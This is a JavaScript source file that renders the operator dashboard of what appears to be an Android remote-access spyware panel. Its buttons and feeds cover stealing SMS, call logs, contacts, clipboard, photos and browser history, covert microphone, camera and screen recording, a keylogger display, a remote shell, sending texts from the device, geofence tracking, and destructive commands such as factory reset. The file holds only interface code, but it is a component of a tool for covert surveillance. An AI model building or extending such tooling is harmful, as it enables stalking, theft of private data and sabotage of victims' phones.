// js/ui-injector.js

export function injectAdvancedControls() {
    const injector = document.getElementById('advanced-controls-injector');
    if (!injector || document.getElementById('cmd-audio')) return; // Prevent duplicates

    const html = `
        <div class="section-header"><h3>📊 DATA EXTRACTION</h3></div>
        ${createBtn('cmd-readsms', 'fa-message', 'READ SMS', 'TRIGGER')}
        ${createBtn('cmd-readcalls', 'fa-phone', 'CALL LOG', 'TRIGGER')}
        ${createBtn('cmd-readcontacts', 'fa-address-book', 'CONTACTS', 'TRIGGER')}
        ${createBtn('cmd-readapps', 'fa-grid-2', 'APP LIST', 'TRIGGER')}
        ${createBtn('cmd-scanwifi', 'fa-wifi', 'SCAN WIFI', 'TRIGGER')}
        ${createBtn('cmd-readbattery', 'fa-battery-full', 'BATTERY', 'TRIGGER')}
        ${createBtn('cmd-readtraffic', 'fa-arrow-up-arrow-down', 'TRAFFIC', 'TRIGGER')}
        ${createBtn('cmd-deviceinfo', 'fa-circle-info', 'DEVICE INFO', 'TRIGGER')}
        ${createBtn('cmd-clipboard', 'fa-clipboard', 'CLIPBOARD', 'OFF')}
        ${createBtn('cmd-gallery', 'fa-images', 'GALLERY', 'TRIGGER')}
        ${createBtn('cmd-browser', 'fa-globe', 'BROWSER HIST', 'TRIGGER')}

        <div class="section-header"><h3>🎮 REMOTE CONTROL</h3></div>
        ${createBtn('cmd-screenshot', 'fa-camera-retro', 'SCREENSHOT', 'TRIGGER')}
        ${createBtn('cmd-storage', 'fa-hard-drive', 'STORAGE', 'TRIGGER')}
        ${createBtn('cmd-audio', 'fa-microphone-lines', 'AUDIO REC', 'OFF')}
        ${createBtn('cmd-video', 'fa-video', 'VIDEO REC', 'OFF')}
        ${createBtn('cmd-ambient', 'fa-wave-square', 'AMBIENT MIC', 'OFF')}
        ${createBtn('cmd-screenrec', 'fa-desktop', 'SCREEN REC', 'OFF')}

        <div class="section-header"><h3>⚠️ DANGER ZONE</h3></div>
        ${createBtn('cmd-uninstall', 'fa-trash', 'UNINSTALL APP', 'TRIGGER', '#ff6b6b')}
        ${createBtn('cmd-reboot', 'fa-power-off', 'REBOOT', 'TRIGGER', '#ff6b6b')}
        ${createBtn('cmd-shutdown', 'fa-plug-circle-xmark', 'SHUTDOWN', 'TRIGGER', '#ff6b6b')}
        ${createBtn('cmd-factory', 'fa-bomb', 'FACTORY RESET', 'TRIGGER', '#ff0000')}
        ${createBtn('cmd-locknow', 'fa-lock', 'LOCK NOW', 'TRIGGER', '#ff6b6b')}

        <div class="time-control-wrapper">
            <label class="time-control-label"><i class="fa-solid fa-clock"></i> DAILY ACTIVATION CYCLE</label>
            <input type="time" id="time-setter">
        </div>

        <div class="shell-control-wrapper">
            <label class="time-control-label"><i class="fa-solid fa-terminal"></i> REMOTE SHELL</label>
            <div style="display:flex;gap:8px;">
                <input type="text" id="shell-input" placeholder="ls /sdcard" style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;font-family:monospace;">
                <button id="cmd-shell" style="padding:10px 20px;background:#00ff88;color:#000;border:none;border-radius:8px;font-weight:bold;cursor:pointer;">RUN</button>
            </div>
            <pre id="shell-output" style="display:none;"></pre>
        </div>

        <div class="shell-control-wrapper">
            <label class="time-control-label"><i class="fa-solid fa-paper-plane"></i> SEND SMS</label>
            <div style="display:flex;gap:8px;margin-bottom:8px;">
                <input type="text" id="sms-number" placeholder="+256700123456" style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;">
            </div>
            <div style="display:flex;gap:8px;">
                <input type="text" id="sms-body" placeholder="Message text..." style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;">
                <button id="cmd-sendsms" style="padding:10px 20px;background:#ff6b6b;color:#fff;border:none;border-radius:8px;font-weight:bold;cursor:pointer;">SEND</button>
            </div>
        </div>

        <div class="shell-control-wrapper">
            <label class="time-control-label"><i class="fa-solid fa-folder-open"></i> FILE BROWSER</label>
            <div style="display:flex;gap:8px;">
                <input type="text" id="file-path" placeholder="/storage/emulated/0" value="/storage/emulated/0" style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;font-family:monospace;">
                <button id="cmd-listfiles" style="padding:10px 20px;background:#4ecdc4;color:#000;border:none;border-radius:8px;font-weight:bold;cursor:pointer;">LIST</button>
            </div>
            <div id="file-output" style="display:none;"></div>
        </div>

        <div class="shell-control-wrapper">
            <label class="time-control-label"><i class="fa-solid fa-location-crosshairs"></i> GEOFENCE</label>
            <div style="display:flex;gap:8px;margin-bottom:8px;">
                <input type="number" id="geo-lat" placeholder="Lat" step="0.000001" style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;">
                <input type="number" id="geo-lng" placeholder="Lng" step="0.000001" style="flex:1;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;">
                <input type="number" id="geo-radius" placeholder="Radius (m)" value="1000" style="width:100px;padding:10px;background:#1a1a2e;border:1px solid #333;color:#fff;border-radius:8px;">
            </div>
            <div style="display:flex;gap:8px;">
                <button id="cmd-setgeo" style="flex:1;padding:10px;background:#ffd93d;color:#000;border:none;border-radius:8px;font-weight:bold;cursor:pointer;">SET GEOFENCE</button>
                <button id="cmd-disablegeo" style="padding:10px 20px;background:#ff6b6b;color:#fff;border:none;border-radius:8px;font-weight:bold;cursor:pointer;">DISABLE</button>
            </div>
        </div>

        <div class="data-panels-grid">
            <div class="data-panel"><div class="data-panel-header">📱 SMS Messages <span id="sms-count" class="badge">0</span></div><div class="data-panel-body" id="sms-feed">Waiting for data...</div></div>
            <div class="data-panel"><div class="data-panel-header">📞 Call Log <span id="calls-count" class="badge">0</span></div><div class="data-panel-body" id="calls-feed">Waiting for data...</div></div>
            <div class="data-panel"><div class="data-panel-header">👥 Contacts <span id="contacts-count" class="badge">0</span></div><div class="data-panel-body" id="contacts-feed">Waiting for data...</div></div>
            <div class="data-panel"><div class="data-panel-header"> Wi-Fi Networks <span id="wifi-count" class="badge">0</span></div><div class="data-panel-body" id="wifi-feed">Waiting for data...</div></div>
            <div class="data-panel"><div class="data-panel-header"> Installed Apps <span id="apps-count" class="badge">0</span></div><div class="data-panel-body" id="apps-feed">Waiting for data...</div></div>
            <div class="data-panel"><div class="data-panel-header">📋 Device Info</div><div class="data-panel-body" id="deviceinfo-feed">Waiting for data...</div></div>
            <div class="data-panel"><div class="data-panel-header">🔋 Battery Details</div><div class="data-panel-body" id="battery-feed">Waiting for data...</div></div>
            <div class="data-panel"><div class="data-panel-header">⌨️ Keylogger <span id="keylog-count" class="badge">0</span></div><div class="data-panel-body" id="keylog-feed">Waiting for data...</div></div>
            <div class="data-panel"><div class="data-panel-header">📍 Geofence Alerts</div><div class="data-panel-body" id="geofence-feed">No alerts</div></div>
            <div class="data-panel"><div class="data-panel-header">📋 Clipboard</div><div class="data-panel-body" id="clipboard-feed">Waiting for data...</div></div>
            <div class="data-panel"><div class="data-panel-header">🌐 Browser History</div><div class="data-panel-body" id="browser-feed">Waiting for data...</div></div>
            <div class="data-panel"><div class="data-panel-header">🖼️ Gallery</div><div class="data-panel-body" id="gallery-feed">Waiting for data...</div></div>
            <div class="data-panel"><div class="data-panel-header"> Network Traffic</div><div class="data-panel-body" id="traffic-feed">Waiting for data...</div></div>
            <div class="data-panel"><div class="data-panel-header">🎙️ Ambient Audio</div><div class="data-panel-body" id="ambient-feed">Not recording</div></div>
            <div class="data-panel"><div class="data-panel-header">⚡ Device Control</div><div class="data-panel-body" id="devicecontrol-feed">Waiting for data...</div></div>
        </div>
    `;
    
    injector.innerHTML = html;
}

function createBtn(id, icon, label, stateText, borderColor = '') {
    const style = borderColor ? `style="border-color:${borderColor}"` : '';
    return `<button id="${id}" class="matrix-btn toggle-btn" ${style}>
                <i class="fa-solid ${icon}"></i>
                <span>${label}</span>
                <span class="toggle-state">${stateText}</span>
            </button>`;
                    }
